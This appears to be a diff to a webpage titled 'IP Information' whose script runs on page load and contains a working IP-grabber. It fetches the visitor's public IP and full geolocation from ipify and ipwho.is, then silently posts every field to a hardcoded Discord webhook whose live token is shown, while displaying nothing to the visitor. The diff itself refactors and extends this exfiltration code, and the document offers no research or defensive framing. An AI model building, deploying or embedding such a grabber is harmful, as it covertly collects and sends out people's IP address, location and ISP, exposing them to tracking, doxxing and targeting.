@@ -2,6 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
 <title>IP Information</title>
 </head>
 <body>
@@ -10,42 +11,32 @@ let FINALL = "";
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1564969198948589728/bhXE0ehqTxTRlPzDHtj9askJxYN4BYI9kE5XH2yEFprDrcwiDWUOLgHdDdN9s88_G-7L";
 
 function flattenObject(obj, prefix = "") {
-    let lines = [];
+    const lines = [];
 
     for (const [key, value] of Object.entries(obj)) {
-        const name = prefix
-            ? prefix + "-" + key
-            : key;
+        const name = prefix ? prefix + "-" + key : key;
 
         if (value !== null && typeof value === "object") {
             lines.push(...flattenObject(value, name));
         } else {
-            lines.push(`${name}: ||${value === null ? "null" : value}||`);
+            lines.push(
+                `${name}: ||${value === null ? "null" : String(value)}||`
+            );
         }
     }
 
     return lines;
 }
 
-async function sendReport() {
-    const response = await fetch("https://ipwho.is/");
-
-    if (!response.ok) {
-        throw new Error("IP lookup failed: " + response.status);
-    }
-
-    FINALL = await response.text();
-
-    const data = JSON.parse(FINALL);
-    const lines = flattenObject(data);
+function splitMessages(lines, maxLength = 1700) {
     const chunks = [];
     let current = "";
 
     for (const line of lines) {
         const next = current ? current + "\n" + line : line;
 
-        if (next.length > 1900) {
-            chunks.push(current);
+        if (next.length > maxLength) {
+            if (current) chunks.push(current);
             current = line;
         } else {
             current = next;
@@ -54,32 +45,85 @@ async function sendReport() {
 
     if (current) chunks.push(current);
 
+    return chunks;
+}
+
+async function sendReport() {
+    if (WEBHOOK_URL === "YOUR_WEBHOOK_URL") {
+        throw new Error("Configure WEBHOOK_URL before running.");
+    }
+
+    // Obtain the public IPv4 address.
+    const ipResponse = await fetch(
+        "https://api4.ipify.org?format=json"
+    );
+
+    if (!ipResponse.ok) {
+        throw new Error("IPv4 lookup failed: " + ipResponse.status);
+    }
+
+    const ipResult = await ipResponse.json();
+    const ipv4 = ipResult.ip;
+
+    // Request all available information for that IPv4 address.
+    const response = await fetch(
+        "https://ipwho.is/" + encodeURIComponent(ipv4)
+    );
+
+    if (!response.ok) {
+        throw new Error("IP information request failed: " + response.status);
+    }
+
+    // Keep the complete raw JSON response in FINALL.
+    FINALL = await response.text();
+
+    const data = JSON.parse(FINALL);
+
+    if (data.success === false) {
+        throw new Error("IP lookup failed: " + (data.message || "Unknown error"));
+    }
+
+    // Format all fields, including nested objects.
+    const lines = flattenObject(data);
+    const chunks = splitMessages(lines);
+
+    // Send each chunk as a readable Discord code block.
     for (let i = 0; i < chunks.length; i++) {
         const content =
             "```text\n" +
-            (chunks.length > 1
-                ? `--\nIP INFORMATION (${i + 1}/${chunks.length})\n`
-                : "IP INFORMATION\n") +
+            "IP INFORMATION (" + (i + 1) + "/" + chunks.length + ")\n" +
             chunks[i] +
             "\n```";
 
-        const result = await fetch(WEBHOOK_URL, {
+        const webhookResponse = await fetch(WEBHOOK_URL, {
             method: "POST",
             headers: {
                 "Content-Type": "application/json"
             },
-            body: JSON.stringify({ content })
+            body: JSON.stringify({
+                content: content,
+                allowed_mentions: {
+                    parse: []
+                }
+            })
         });
 
-        if (!result.ok) {
-            throw new Error("Webhook failed: " + result.status);
+        if (!webhookResponse.ok) {
+            throw new Error(
+                "Webhook request failed: " + webhookResponse.status
+            );
         }
     }
 
-    console.log("Report sent successfully!");
+    console.log("Report sent successfully.");
+    console.log("FINALL:", FINALL);
 }
 
-sendReport().catch(error => console.error(error));
+sendReport().catch(error => {
+    console.error("Report failed:", error);
+});
 </script>
 </body>
 </html>
+
+
